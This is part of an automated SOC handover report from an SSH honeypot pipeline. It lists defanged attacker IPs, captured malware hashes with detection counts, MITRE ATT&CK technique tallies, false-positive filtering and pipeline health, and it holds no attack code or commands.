| `152.32.213[.]101` | 1 | 2026-04-28 07:01 | 2026-04-28 07:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.218[.]149` | 1 | 2026-04-28 10:15 | 2026-04-28 10:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `177.43.83[.]43` | 1 | 2026-04-28 08:09 | 2026-04-28 08:09 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.36[.]192` | 1 | 2026-04-28 06:33 | 2026-04-28 06:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.235[.]114` | 1 | 2026-04-28 06:36 | 2026-04-28 06:38 | 112s | 0 | `T1592` | 🟢 LOW |
| `218.207.25[.]249` | 1 | 2026-04-28 06:56 | 2026-04-28 06:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.154.131[.]111` | 1 | 2026-04-28 10:07 | 2026-04-28 10:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `24.19.160[.]116` | 1 | 2026-04-28 10:13 | 2026-04-28 10:13 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-28 06:51 | 2026-04-28 06:53 | 92s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]177` | 1 | 2026-04-28 06:34 | 2026-04-28 06:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `81.9.140[.]220` | 1 | 2026-04-28 07:46 | 2026-04-28 07:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `84.201.243[.]44` | 1 | 2026-04-28 10:17 | 2026-04-28 10:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `24.19.160[.]116` | US | Comcast Cable Communications | **100** ⚠️ | 4 |
| `66.132.186[.]177` | US | Censys, Inc. | **100** ⚠️ | 37 |
| `99.227.226[.]242` | CA | Rogers Cable Inc. HNSN | **100** ⚠️ | 0 |
| `110.239.88[.]219` | ID | HUAWEI INTERNATIONAL PTE. LTD. | **100** ⚠️ | 3 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `177.43.83[.]43` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 3 |
| `177.65.107[.]71` | BR | Claro NXT Telecomunicacoes Ltda | **100** ⚠️ | 0 |
| `114.220.176[.]69` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `220.154.131[.]111` | CN | China Telecom Group Corporation Qingdao Branch | **100** ⚠️ | 1 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 64 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 22 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |

---

## 🔕 False Positive Summary (40 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 16 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 186 cases |
| Tool 34  | Credential Extractor        | ✅ 36 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 46 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 40 filtered (21.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 32 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 22 priority case(s) shown individually · 34 recon entry/entries in table (8 group(s) consolidating 98 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-28T10:20:06Z_
